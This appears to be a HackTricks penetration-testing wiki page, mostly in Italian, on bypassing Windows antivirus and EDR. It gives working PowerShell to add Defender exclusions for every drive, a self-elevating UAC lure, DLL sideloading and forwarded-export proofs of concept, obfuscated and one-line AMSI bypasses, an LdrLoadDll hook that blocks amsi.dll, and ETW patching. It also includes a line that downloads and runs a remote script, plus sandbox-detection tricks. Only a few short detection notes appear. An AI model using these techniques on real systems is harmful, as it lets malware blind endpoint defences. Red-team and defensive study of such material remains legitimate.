# Antivirus (AV) Bypass

{{#include ../banners/hacktricks-training.md}}

**Questa pagina è stata scritta da** [**@m2rc_p**](https://twitter.com/m2rc_p)**!**

## Fermare Defender

- [defendnot](https://github.com/es3n1n/defendnot): Uno strumento per impedire a Windows Defender di funzionare.
- [no-defender](https://github.com/es3n1n/no-defender): Uno strumento per fermare Windows Defender fingendo un altro AV.
- [Disable Defender if you are admin](basic-powershell-for-pentesters/README.md)

### Esca UAC in stile installer prima di manomettere Defender

I loader pubblici che si spacciano per cheat di giochi spesso vengono distribuiti come installer Node.js/Nexe non firmati che prima **richiedono all'utente l'elevazione** e solo dopo neutralizzano Defender. Il flusso è semplice:

1. Verificare il contesto amministrativo con `net session`. Il comando riesce solo quando il chiamante possiede diritti di amministratore, quindi un fallimento indica che il loader è in esecuzione come utente standard.
2. Rilanciarsi immediatamente con il verbo `RunAs` per attivare la prevista richiesta di consenso UAC, mantenendo la riga di comando originale.
```powershell
if (-not (net session 2>$null)) {
powershell -WindowStyle Hidden -Command "Start-Process cmd.exe -Verb RunAs -WindowStyle Hidden -ArgumentList '/c ""`<path_to_loader`>""'"
exit
}
```
Le vittime credono già di stare installando software “cracked”, quindi la richiesta viene di solito accettata, dando al malware i diritti necessari per modificare la policy di Defender.

### Esclusioni globali `MpPreference` per ogni lettera di unità

Una volta elevato, le catene in stile GachiLoader massimizzano i punti ciechi di Defender invece di disabilitare il servizio del tutto. Il loader prima uccide il GUI watchdog (`taskkill /F /IM SecHealthUI.exe`) e poi applica **esclusioni estremamente ampie** così che ogni profilo utente, directory di sistema e disco rimovibile diventino non scansionabili:
```powershell
$targets = @('C:\Users\', 'C:\ProgramData\', 'C:\Windows\')
Get-PSDrive -PSProvider FileSystem | ForEach-Object { $targets += $_.Root }
$targets | Sort-Object -Unique | ForEach-Object { Add-MpPreference -ExclusionPath $_ }
Add-MpPreference -ExclusionExtension '.sys'
```
Key observations:

- The loop scorre ogni filesystem montato (D:\, E:\, chiavette USB, ecc.) quindi **qualsiasi payload futuro lasciato su disco viene ignorato**.
- L'esclusione dell'estensione `.sys` è proiettata nel futuro—gli attaccanti si riservano l'opzione di caricare driver non firmati più avanti senza ritoccare Defender.
- Tutte le modifiche finiscono sotto `HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions`, permettendo alle fasi successive di confermare che le esclusioni persistono o di ampliarle senza riattivare l'UAC.

Poiché nessun servizio di Defender viene arrestato, controlli di integrità superficiali continuano a segnalare “antivirus attivo” anche se l'ispezione in tempo reale non tocca mai quei percorsi.

## **Metodologia di evasione AV**

Attualmente, gli AV utilizzano diversi metodi per verificare se un file sia dannoso o meno: rilevamento statico, analisi dinamica e, per gli EDR più avanzati, analisi comportamentale.

### **Static detection**

Il rilevamento statico viene effettuato segnalando stringhe note o sequenze di byte malevole in un binario o script, ed estraendo anche informazioni dal file stesso (es. file description, company name, digital signatures, icon, checksum, ecc.). Questo significa che usare strumenti pubblici noti può farti beccare più facilmente, poiché probabilmente sono già stati analizzati e segnalati come malevoli. Ci sono un paio di modi per aggirare questo tipo di rilevamento:

- **Encryption**

Se crittografate il binario, non ci sarà modo per l'AV di rilevare il vostro programma, ma avrete bisogno di qualche tipo di loader per decrittare ed eseguire il programma in memoria.

- **Obfuscation**

A volte tutto ciò che serve è cambiare alcune stringhe nel vostro binario o script per passare oltre l'AV, ma questo può richiedere tempo a seconda di cosa state cercando di offuscare.

- **Custom tooling**

Se sviluppate i vostri strumenti, non ci saranno signature note come malevole, ma questo richiede molto tempo e sforzo.

> [!TIP]
> Un buon modo per verificare il rilevamento statico di Windows Defender è [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck). Fondamentalmente divide il file in più segmenti e poi chiede a Defender di scansionare ciascuno separatamente; in questo modo può dirvi esattamente quali stringhe o byte nel vostro binario vengono segnalati.

Consiglio vivamente di dare un'occhiata a questa [YouTube playlist](https://www.youtube.com/playlist?list=PLj05gPj8rk_pkb12mDe4PgYZ5qPxhGKGf) su AV Evasion pratico.

### **Dynamic analysis**

L'analisi dinamica è quando l'AV esegue il vostro binario in una sandbox e osserva attività malevole (es. cercare di decrittare e leggere le password del browser, effettuare un minidump su LSASS, ecc.). Questa parte può essere più complessa da gestire, ma ecco alcune cose che potete fare per evadere le sandbox.

- **Sleep before execution** A seconda di come è implementato, può essere un ottimo modo per bypassare l'analisi dinamica dell'AV. Gli AV hanno pochissimo tempo per analizzare i file per non interrompere il flusso dell'utente, quindi usare sleep lunghi può disturbare l'analisi dei binari. Il problema è che molte sandbox degli AV possono semplicemente saltare lo sleep a seconda di come è implementato.
- **Checking machine's resources** Di solito le sandbox hanno pochissime risorse a disposizione (es. < 2GB RAM), altrimenti rallenterebbero la macchina dell'utente. Qui potete anche diventare creativi, per esempio controllando la temperatura della CPU o anche la velocità delle ventole; non tutto sarà implementato nella sandbox.
- **Machine-specific checks** Se volete mirare a un utente la cui workstation è joinata al dominio "contoso.local", potete controllare il dominio del computer per vedere se coincide con quello specificato; in caso contrario potete far terminare il programma.

Risulta che il computername della Sandbox di Microsoft Defender è HAL9TH, quindi potete controllare il nome del computer nel vostro malware prima della detonazione; se il nome corrisponde a HAL9TH significa che siete dentro la sandbox di Defender, e potete far uscire il programma.

<figure><img src="../images/image (209).png" alt=""><figcaption><p>fonte: <a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>

Alcuni altri ottimi consigli da [@mgeeky](https://twitter.com/mariuszbit) per contrastare le Sandboxes

<figure><img src="../images/image (248).png" alt=""><figcaption><p><a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Red Team VX Discord</a> #malware-dev channel</p></figcaption></figure>

Come detto prima in questo post, **gli strumenti pubblici** alla fine **verranno rilevati**, quindi dovreste porvi una domanda:

Per esempio, se volete dumpare LSASS, **avete davvero bisogno di usare mimikatz**? O potreste usare un progetto differente, meno conosciuto e che dumpi comunque LSASS.

La risposta giusta è probabilmente la seconda. Prendendo mimikatz come esempio, è probabilmente uno dei progetti più segnalati dagli AV e dagli EDR; pur essendo un progetto molto valido, è anche un incubo cercare di adattarlo per aggirare gli AV, quindi cercate alternative per quello che volete ottenere.

> [!TIP]
> Quando modificate i vostri payload per l'evasione, assicuratevi di **disattivare l'invio automatico dei sample** in defender e, per favore, seriamente, **DO NOT UPLOAD TO VIRUSTOTAL** se il vostro obiettivo è ottenere evasione a lungo termine. Se volete verificare se il vostro payload viene rilevato da un particolare AV, installatelo in una VM, provate a disattivare l'invio automatico dei sample e testatelo lì finché non siete soddisfatti del risultato.

## EXEs vs DLLs

Quando è possibile, date sempre la priorità all'uso delle DLL per l'evasione; per esperienza, i file DLL sono di solito **molto meno rilevati** e analizzati, quindi è un trucco semplice da usare per evitare il rilevamento in alcuni casi (se il vostro payload può essere eseguito come DLL, ovviamente).

Come si vede in questa immagine, un DLL Payload da Havoc ha un detection rate di 4/26 su antiscan.me, mentre il payload EXE ha un detection rate di 7/26.

<figure><img src="../images/image (1130).png" alt=""><figcaption><p>antiscan.me comparison of a normal Havoc EXE payload vs a normal Havoc DLL</p></figcaption></figure>

Ora mostreremo alcuni trucchi che potete usare con i file DLL per essere molto più stealth.

## DLL Sideloading & Proxying

**DLL Sideloading** sfrutta l'ordine di ricerca delle DLL usato dal loader posizionando l'applicazione vittima e il/i payload malevoli affiancati.

Potete cercare programmi suscettibili a DLL Sideloading usando [Siofra](https://github.com/Cybereason/siofra) e lo script powershell seguente:
```bash
Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object {
$binarytoCheck = "C:\Program Files\" + $_
C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
}
```
This command will output the list of programs susceptible to DLL hijacking inside "C:\Program Files\\" and the DLL files they try to load.

Consiglio vivamente di **esplorare DLL Hijackable/Sideloadable programs yourself**, questa tecnica è pretty stealthy se eseguita correttamente, ma se usi programmi pubblicamente noti come DLL Sideloadable, potresti essere facilmente scoperto.

Semplicemente piazzando una DLL malevola con il nome che un programma si aspetta di caricare, non caricherà il tuo payload, poiché il programma si aspetta alcune funzioni specifiche dentro quella DLL; per risolvere questo problema useremo un'altra tecnica chiamata **DLL Proxying/Forwarding**.

**DLL Proxying** inoltra le chiamate che il programma fa dalla DLL proxy (maligna) alla DLL originale, preservando così la funzionalità del programma e permettendo di gestire l'esecuzione del tuo payload.

Userò il progetto [SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy) di [@flangvik](https://twitter.com/Flangvik/)

Questi sono i passaggi che ho seguito:
```
1. Find an application vulnerable to DLL Sideloading (siofra or using Process Hacker)
2. Generate some shellcode (I used Havoc C2)
3. (Optional) Encode your shellcode using Shikata Ga Nai (https://github.com/EgeBalci/sgn)
4. Use SharpDLLProxy to create the proxy dll (.\SharpDllProxy.exe --dll .\mimeTools.dll --payload .\demon.bin)
```
L'ultimo comando ci darà 2 file: a DLL source code template e la DLL originale rinominata.

<figure><img src="../images/sharpdllproxy.gif" alt=""><figcaption></figcaption></figure>
```
5. Create a new visual studio project (C++ DLL), paste the code generated by SharpDLLProxy (Under output_dllname/dllname_pragma.c) and compile. Now you should have a proxy dll which will load the shellcode you've specified and also forward any calls to the original DLL.
```
<figure><img src="../images/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>

Sia il nostro shellcode (encoded with [SGN](https://github.com/EgeBalci/sgn)) sia la proxy DLL hanno un tasso di rilevamento 0/26 su [antiscan.me](https://antiscan.me)! Lo considererei un successo.

<figure><img src="../images/image (193).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Ti raccomando vivamente di guardare [S3cur3Th1sSh1t's twitch VOD](https://www.twitch.tv/videos/1644171543) su DLL Sideloading e anche [ippsec's video](https://www.youtube.com/watch?v=3eROsG_WNpE) per approfondire quanto discusso.

### Abuso degli export inoltrati (ForwardSideLoading)

I moduli PE di Windows possono esportare funzioni che in realtà sono "forwarders": invece di puntare a codice, la voce di export contiene una stringa ASCII del tipo `TargetDll.TargetFunc`. Quando un chiamante risolve l'export, il loader di Windows:

- Carica `TargetDll` se non è già stato caricato
- Risolve `TargetFunc` da esso

Comportamenti chiave da comprendere:
- Se `TargetDll` è una KnownDLL, viene fornita dallo spazio dei nomi protetto KnownDLLs (es., ntdll, kernelbase, ole32).
- Se `TargetDll` non è una KnownDLL, viene usato l'ordinamento di ricerca DLL normale, che include la directory del modulo che sta eseguendo la forward resolution.

Questo abilita una primitive di sideloading indiretto: trova una signed DLL che esporta una funzione inoltrata a un nome di modulo non-KnownDLL, quindi posiziona insieme a quella signed DLL una attacker-controlled DLL chiamata esattamente come il modulo target inoltrato. Quando l'export inoltrato viene invocato, il loader risolve il forward e carica la tua DLL dalla stessa directory, eseguendo la tua DllMain.

Esempio osservato su Windows 11:
```
keyiso.dll KeyIsoSetAuditingInterface -> NCRYPTPROV.SetAuditingInterface
```
`NCRYPTPROV.dll` non è un KnownDLL, quindi viene risolta tramite l'ordine di ricerca normale.

PoC (copy-paste):
1) Copiare la DLL di sistema firmata in una cartella scrivibile
```
copy C:\Windows\System32\keyiso.dll C:\test\
```
2) Posiziona un `NCRYPTPROV.dll` maligno nella stessa cartella. Un DllMain minimale è sufficiente per ottenere l'esecuzione di codice; non è necessario implementare la funzione inoltrata per attivare DllMain.
```c
// x64: x86_64-w64-mingw32-gcc -shared -o NCRYPTPROV.dll ncryptprov.c
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE hinst, DWORD reason, LPVOID reserved){
if (reason == DLL_PROCESS_ATTACH){
HANDLE h = CreateFileA("C\\\\test\\\\DLLMain_64_DLL_PROCESS_ATTACH.txt", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
if(h!=INVALID_HANDLE_VALUE){ const char *m = "hello"; DWORD w; WriteFile(h,m,5,&w,NULL); CloseHandle(h);}
}
return TRUE;
}
```
3) Attiva il forward con un LOLBin firmato:
```
rundll32.exe C:\test\keyiso.dll, KeyIsoSetAuditingInterface
```
Comportamento osservato:
- rundll32 (signed) carica il side-by-side `keyiso.dll` (signed)
- Durante la risoluzione di `KeyIsoSetAuditingInterface`, il loader segue il forward verso `NCRYPTPROV.SetAuditingInterface`
- Il loader poi carica `NCRYPTPROV.dll` da `C:\test` ed esegue il suo `DllMain`
- Se `SetAuditingInterface` non è implementata, otterrai un errore "missing API" solo dopo che `DllMain` è già stato eseguito

Hunting tips:
- Concentrati sui forwarded exports dove il modulo target non è un KnownDLL. KnownDLLs sono elencati sotto `HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs`.
- Puoi enumerare i forwarded exports con strumenti come:
```
dumpbin /exports C:\Windows\System32\keyiso.dll
# forwarders appear with a forwarder string e.g., NCRYPTPROV.SetAuditingInterface
```
- Vedi l'inventario dei forwarder di Windows 11 per cercare candidati: https://hexacorn.com/d/apis_fwd.txt

Detection/defense ideas:
- Monitorare LOLBins (es., rundll32.exe) che caricano DLL firmate da percorsi non di sistema, seguite dal caricamento di non-KnownDLLs con lo stesso nome base da quella directory
- Segnalare catene processo/modulo come: `rundll32.exe` → non-system `keyiso.dll` → `NCRYPTPROV.dll` in percorsi scrivibili dall'utente
- Applicare policy di integrità del codice (WDAC/AppLocker) e negare write+execute nelle directory delle applicazioni

## [**Freeze**](https://github.com/optiv/Freeze)

`Freeze is a payload toolkit for bypassing EDRs using suspended processes, direct syscalls, and alternative execution methods`

Puoi usare Freeze per caricare ed eseguire il tuo shellcode in modo furtivo.
```
Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freeze.git && cd Freeze && go build Freeze.go)
1. Generate some shellcode, in this case I used Havoc C2.
2. ./Freeze -I demon.bin -encrypt -O demon.exe
3. Profit, no alerts from defender
```
<figure><img src="../images/freeze_demo_hacktricks.gif" alt=""><figcaption></figcaption></figure>

> [!TIP]
> L'evasione è solo un gioco del gatto e del topo: ciò che funziona oggi potrebbe essere rilevato domani, quindi non fare mai affidamento su un unico strumento; se possibile, prova a concatenare più tecniche di evasione.

## AMSI (Anti-Malware Scan Interface)

AMSI è stato creato per prevenire "[fileless malware](https://en.wikipedia.org/wiki/Fileless_malware)". Inizialmente, gli AV erano in grado di scansionare solo i **file su disco**, quindi se si riusciva in qualche modo a eseguire payload **directly in-memory**, l'AV non poteva fare nulla per impedirlo, perché non aveva sufficiente visibilità.

La funzionalità AMSI è integrata in questi componenti di Windows.

- User Account Control, or UAC (elevazione di EXE, COM, MSI o installazione ActiveX)
- PowerShell (script, uso interattivo e valutazione dinamica del codice)
- Windows Script Host (wscript.exe e cscript.exe)
- JavaScript e VBScript
- Office VBA macros

Consente alle soluzioni antivirus di ispezionare il comportamento degli script esponendo il contenuto degli script in una forma non crittografata e non offuscata.

Eseguire `IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')` produrrà il seguente avviso su Windows Defender.

<figure><img src="../images/image (1135).png" alt=""><figcaption></figcaption></figure>

Nota come antepone `amsi:` e poi il percorso dell'eseguibile da cui lo script è stato eseguito, in questo caso powershell.exe

Non abbiamo scritto alcun file su disco, ma siamo comunque stati individuati in-memory a causa di AMSI.

Inoltre, a partire da **.NET 4.8**, il codice C# viene eseguito attraverso AMSI. Questo influisce anche su `Assembly.Load(byte[])` per il caricamento ed esecuzione in-memory. Per questo motivo è consigliato usare versioni di .NET inferiori (come 4.7.2 o precedenti) per l'esecuzione in-memory se si vuole eludere AMSI.

Ci sono un paio di modi per aggirare AMSI:

- **Obfuscation**

Poiché AMSI funziona principalmente con rilevazioni statiche, modificare gli script che si tenta di caricare può essere un buon modo per evitare il rilevamento.

Tuttavia, AMSI ha la capacità di de-offuscare gli script anche se hanno più livelli di offuscamento, quindi l'obfuscation potrebbe essere una cattiva opzione a seconda di come viene fatta. Questo la rende non così semplice da eludere. Sebbene a volte tutto ciò che serve sia cambiare un paio di nomi di variabili per cavarsela, dipende da quanto qualcosa è stato segnalato.

- **AMSI Bypass**

Poiché AMSI è implementato caricando una DLL nel processo powershell (anche cscript.exe, wscript.exe, ecc.), è possibile manometterla facilmente anche eseguendo con un utente non privilegiato. A causa di questa debolezza nell'implementazione di AMSI, i ricercatori hanno trovato diversi modi per eludere la scansione AMSI.

**Forcing an Error**

Forzare l'inizializzazione di AMSI a fallire (amsiInitFailed) farà sì che non venga avviata alcuna scansione per il processo corrente. Originariamente questo è stato reso pubblico da [Matt Graeber](https://twitter.com/mattifestation) e Microsoft ha sviluppato una signature per prevenire un uso esteso.
```bash
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```
È bastata una sola riga di codice powershell per rendere AMSI inutilizzabile per l'attuale processo powershell. Questa riga, ovviamente, è stata segnalata dallo stesso AMSI, quindi è necessaria qualche modifica per poter usare questa tecnica.

Ecco un AMSI bypass modificato che ho preso da questo [Github Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db).
```bash
Try{#Ams1 bypass technic nº 2
$Xdatabase = 'Utils';$Homedrive = 'si'
$ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
$DiskMgr = 'Syst+@.MÂ£nÂ£g' + 'e@+nt.Auto@' + 'Â£tion.A' -join ''
$fdx = '@ms' + 'Â£InÂ£' + 'tF@Â£' + 'l+d' -Join '';Start-Sleep -Milliseconds 300
$CleanUp = $DiskMgr.Replace('@','m').Replace('Â£','a').Replace('+','e')
$Rawdata = $fdx.Replace('@','a').Replace('Â£','i').Replace('+','e')
$SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
$Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
$Spotfix.SetValue($null,$true)
}Catch{Throw $_}
```
Keep in mind, that this will probably get flagged once this post comes out, so you should not publish any code if your plan is staying undetected.

**Memory Patching**

This technique was initially discovered by [@RastaMouse](https://twitter.com/_RastaMouse/) and it involves finding address for the "AmsiScanBuffer" function in amsi.dll (responsible for scanning the user-supplied input) and overwriting it with instructions to return the code for E_INVALIDARG, this way, the result of the actual scan will return 0, which is interpreted as a clean result.

> [!TIP]
> Please read [https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/) for a more detailed explanation.

There are also many other techniques used to bypass AMSI with powershell, check out [**this page**](basic-powershell-for-pentesters/index.html#amsi-bypass) and [**this repo**](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell) to learn more about them.

### Blocking AMSI by preventing amsi.dll load (LdrLoadDll hook)

AMSI is initialised only after `amsi.dll` is loaded into the current process. A robust, language‑agnostic bypass is to place a user‑mode hook on `ntdll!LdrLoadDll` that returns an error when the requested module is `amsi.dll`. As a result, AMSI never loads and no scans occur for that process.

Implementation outline (x64 C/C++ pseudocode):
```c
#include <windows.h>
#include <winternl.h>

typedef NTSTATUS (NTAPI *pLdrLoadDll)(PWSTR, ULONG, PUNICODE_STRING, PHANDLE);
static pLdrLoadDll realLdrLoadDll;

NTSTATUS NTAPI Hook_LdrLoadDll(PWSTR path, ULONG flags, PUNICODE_STRING module, PHANDLE handle){
if (module && module->Buffer){
UNICODE_STRING amsi; RtlInitUnicodeString(&amsi, L"amsi.dll");
if (RtlEqualUnicodeString(module, &amsi, TRUE)){
// Pretend the DLL cannot be found → AMSI never initialises in this process
return STATUS_DLL_NOT_FOUND; // 0xC0000135
}
}
return realLdrLoadDll(path, flags, module, handle);
}

void InstallHook(){
HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
realLdrLoadDll = (pLdrLoadDll)GetProcAddress(ntdll, "LdrLoadDll");
// Apply inline trampoline or IAT patching to redirect to Hook_LdrLoadDll
// e.g., Microsoft Detours / MinHook / custom 14‑byte jmp thunk
}
```
Note
- Funziona su PowerShell, WScript/CScript e custom loaders allo stesso modo (qualsiasi cosa che altrimenti caricherebbe AMSI).
- Abbinalo all'invio di script tramite stdin (`PowerShell.exe -NoProfile -NonInteractive -Command -`) per evitare artefatti di riga di comando lunghi.
- Visto usato da loader eseguiti tramite LOLBins (e.g., `regsvr32` calling `DllRegisterServer`).

The tool **[https://github.com/Flangvik/AMSI.fail](https://github.com/Flangvik/AMSI.fail)** also generates script to bypass AMSI.
The tool **[https://amsibypass.com/](https://amsibypass.com/)** also generates script to bypass AMSI that avoid signature by randomized user-defined function, variables, characters expression and applies random character casing to PowerShell keywords to avoid signature.

**Rimuovere la signature rilevata**

Puoi usare uno strumento come **[https://github.com/cobbr/PSAmsi](https://github.com/cobbr/PSAmsi)** e **[https://github.com/RythmStick/AMSITrigger](https://github.com/RythmStick/AMSITrigger)** per rimuovere la AMSI signature rilevata dalla memoria del processo corrente. Questo strumento funziona scansionando la memoria del processo corrente alla ricerca della AMSI signature e poi sovrascrivendola con istruzioni NOP, rimuovendola effettivamente dalla memoria.

**Prodotti AV/EDR che usano AMSI**

Puoi trovare una lista di prodotti AV/EDR che utilizzano AMSI in **[https://github.com/subat0mik/whoamsi](https://github.com/subat0mik/whoamsi)**.

**Usa PowerShell versione 2**
Se usi PowerShell versione 2, AMSI non verrà caricato, quindi puoi eseguire i tuoi script senza che vengano scansionati da AMSI. Puoi farlo così:
```bash
powershell.exe -version 2
```
## PS Logging

PowerShell logging è una funzionalità che consente di registrare tutti i comandi PowerShell eseguiti su un sistema. Questo può essere utile per scopi di audit e risoluzione dei problemi, ma può anche rappresentare un **problema per gli attaccanti che vogliono eludere il rilevamento**.

Per eludere la registrazione di PowerShell, puoi usare le seguenti tecniche:

- **Disable PowerShell Transcription and Module Logging**: Puoi usare uno strumento come [https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs](https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs) per questo scopo.
- **Use Powershell version 2**: Se usi PowerShell versione 2, AMSI non verrà caricato, quindi puoi eseguire i tuoi script senza che vengano scansionati da AMSI. Puoi farlo: `powershell.exe -version 2`
- **Use an Unmanaged Powershell Session**: Usa [https://github.com/leechristensen/UnmanagedPowerShell](https://github.com/leechristensen/UnmanagedPowerShell) per spawnare una sessione powershell non gestita senza difese (questo è ciò che `powerpick` di Cobal Strike usa).


## Offuscamento

> [!TIP]
> Diverse tecniche di offuscamento si basano sulla cifratura dei dati, il che aumenterà l'entropia del binario rendendo più facile per AVs e EDRs rilevarlo. Fai attenzione a questo e valuta di applicare la cifratura solo a sezioni specifiche del codice che sono sensibili o devono essere nascoste.

### Deoffuscazione dei binari .NET protetti da ConfuserEx

Quando si analizza malware che utilizza ConfuserEx 2 (o fork commerciali) è comune affrontare diversi livelli di protezione che bloccheranno i decompilatori e le sandbox. Il workflow qui sotto ripristina in modo affidabile **un IL quasi originale** che può poi essere decompilato in C# con strumenti come dnSpy o ILSpy.

1.  Rimozione dell'anti-tamper – ConfuserEx cifra ogni *method body* e lo decifra all'interno del costruttore statico del *module* (`<Module>.cctor`). Questo inoltre patcha il checksum PE quindi qualsiasi modifica provocherà il crash del binario. Usa **AntiTamperKiller** per individuare le tabelle di metadata criptate, recuperare le chiavi XOR e riscrivere un assembly pulito:
```bash
# https://github.com/wwh1004/AntiTamperKiller
python AntiTamperKiller.py Confused.exe Confused.clean.exe
```
L'output contiene i 6 parametri anti-tamper (`key0-key3`, `nameHash`, `internKey`) che possono essere utili quando si costruisce un proprio unpacker.

2.  Recupero simboli / control-flow – fornisci il file *clean* a **de4dot-cex** (un fork di de4dot consapevole di ConfuserEx).
```bash
de4dot-cex -p crx Confused.clean.exe -o Confused.de4dot.exe
```
Flag:
• `-p crx` – seleziona il profilo ConfuserEx 2
• de4dot annullerà il control-flow flattening, ripristinerà gli namespace, le classi e i nomi delle variabili originali e decrittograferà le stringhe costanti.

3.  Rimozione delle proxy-call – ConfuserEx sostituisce le chiamate dirette ai metodi con wrapper leggeri (a.k.a *proxy calls*) per complicare ulteriormente la decompilazione. Rimuovile con **ProxyCall-Remover**:
```bash
ProxyCall-Remover.exe Confused.de4dot.exe Confused.fixed.exe
```
Dopo questo passaggio dovresti osservare API .NET normali come `Convert.FromBase64String` o `AES.Create()` invece di funzioni wrapper opache (`Class8.smethod_10`, …).

4.  Pulizia manuale – esegui il binario risultante sotto dnSpy, cerca grandi blob Base64 o l'uso di `RijndaelManaged`/`TripleDESCryptoServiceProvider` per localizzare il payload *reale*. Spesso il malware lo memorizza come un array di byte codificato TLV inizializzato all'interno di `<Module>.byte_0`.

La catena sopra ripristina il flusso di esecuzione **senza** la necessità di eseguire il campione maligno – utile quando si lavora su una workstation offline.

> 🛈  ConfuserEx produce un attributo custom chiamato `ConfusedByAttribute` che può essere usato come IOC per triage automatico dei sample.

#### One-liner
```bash
autotok.sh Confused.exe  # wrapper that performs the 3 steps above sequentially
```
---

- [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**: C# obfuscator**
- [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): Lo scopo di questo progetto è fornire un fork open-source della [LLVM](http://www.llvm.org/) compilation suite in grado di aumentare la sicurezza del software tramite [code obfuscation](<http://en.wikipedia.org/wiki/Obfuscation_(software)>) e protezione contro la manomissione.
- [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): ADVobfuscator dimostra come usare il linguaggio `C++11/14` per generare, a tempo di compilazione, codice offuscato senza usare strumenti esterni e senza modificare il compilatore.
- [**obfy**](https://github.com/fritzone/obfy): Aggiunge un livello di operazioni offuscate generate dal framework di C++ template metaprogramming che renderà la vita di chi vuole crackare l'applicazione un po' più difficile.
- [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Alcatraz è un obfuscator binario x64 in grado di offuscare diversi file PE inclusi: .exe, .dll, .sys
- [**metame**](https://github.com/a0rtega/metame): Metame è un semplice motore di codice metamorfico per eseguibili arbitrari.
- [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): ROPfuscator è un framework di obfuscazione del codice a grana fine per linguaggi supportati da LLVM che utilizza ROP (return-oriented programming). ROPfuscator offusca un programma a livello di codice assembly trasformando istruzioni regolari in catene ROP, ostacolando la nostra concezione naturale del normale flusso di controllo.
- [**Nimcrypt**](https://github.com/icyguider/nimcrypt): Nimcrypt è un .NET PE Crypter scritto in Nim
- [**inceptor**](https://github.com/klezVirus/inceptor)**:** Inceptor è in grado di convertire EXE/DLL esistenti in shellcode e poi caricarli

## SmartScreen & MoTW

Potresti aver visto questa schermata quando scarichi alcuni eseguibili da internet ed li esegui.

Microsoft Defender SmartScreen è un meccanismo di sicurezza pensato per proteggere l'utente finale dall'esecuzione di applicazioni potenzialmente dannose.

<figure><img src="../images/image (664).png" alt=""><figcaption></figcaption></figure>

SmartScreen funziona principalmente con un approccio basato sulla reputazione, il che significa che applicazioni scaricate raramente attiveranno SmartScreen avvisando e impedendo all'utente finale di eseguire il file (anche se il file può comunque essere eseguito cliccando More Info -> Run anyway).

**MoTW** (Mark of The Web) è un [NTFS Alternate Data Stream](<https://en.wikipedia.org/wiki/NTFS#Alternate_data_stream_(ADS)>) con il nome Zone.Identifier che viene creato automaticamente al download di file da internet, insieme all'URL da cui è stato scaricato.

<figure><img src="../images/image (237).png" alt=""><figcaption><p>Checking the Zone.Identifier ADS for a file downloaded from the internet.</p></figcaption></figure>

> [!TIP]
> È importante notare che gli eseguibili firmati con un certificato di firma **fidato** **non attiveranno SmartScreen**.

Un modo molto efficace per evitare che i tuoi payload ottengano il Mark of The Web è impacchettarli all'interno di qualche tipo di contenitore come un ISO. Questo accade perché Mark-of-the-Web (MOTW) **non può** essere applicato ai volumi **non NTFS**.

<figure><img src="../images/image (640).png" alt=""><figcaption></figcaption></figure>

[**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/) è uno strumento che impacchetta payload in contenitori di output per eludere Mark-of-the-Web.

Esempio d'uso:
```bash
PS C:\Tools\PackMyPayload> python .\PackMyPayload.py .\TotallyLegitApp.exe container.iso

+      o     +              o   +      o     +              o
+             o     +           +             o     +         +
o  +           +        +           o  +           +          o
-_-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-_-_-_-_-_-_-_,------,      o
:: PACK MY PAYLOAD (1.1.0)       -_-_-_-_-_-_-|   /\_/\
for all your container cravings   -_-_-_-_-_-~|__( ^ .^)  +    +
-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-__-_-_-_-_-_-_-''  ''
+      o         o   +       o       +      o         o   +       o
+      o            +      o    ~   Mariusz Banach / mgeeky    o
o      ~     +           ~          <mb [at] binary-offensive.com>
o           +                         o           +           +

[.] Packaging input file to output .iso (iso)...
Burning file onto ISO:
Adding file: /TotallyLegitApp.exe

[+] Generated file written to (size: 3420160): container.iso
```
Here is a demo per bypassare SmartScreen impacchettando payloads dentro file ISO usando [PackMyPayload](https://github.com/mgeeky/PackMyPayload/)

<figure><img src="../images/packmypayload_demo.gif" alt=""><figcaption></figcaption></figure>

## ETW

Event Tracing for Windows (ETW) è un potente meccanismo di logging in Windows che permette ad applicazioni e componenti di sistema di **registrare eventi**. Tuttavia può anche essere usato dai prodotti di sicurezza per monitorare e rilevare attività malevole.

Simile a come AMSI viene disabilitato (bypassato), è anche possibile far ritornare immediatamente la funzione **`EtwEventWrite`** del processo user space senza registrare alcun evento. Questo si ottiene patchando la funzione in memoria per farla ritornare immediatamente, disabilitando di fatto il logging ETW per quel processo.

Puoi trovare più informazioni in **[https://blog.xpnsec.com/hiding-your-dotnet-etw/](https://blog.xpnsec.com/hiding-your-dotnet-etw/) and [https://github.com/repnz/etw-providers-docs/](https://github.com/repnz/etw-providers-docs/)**.


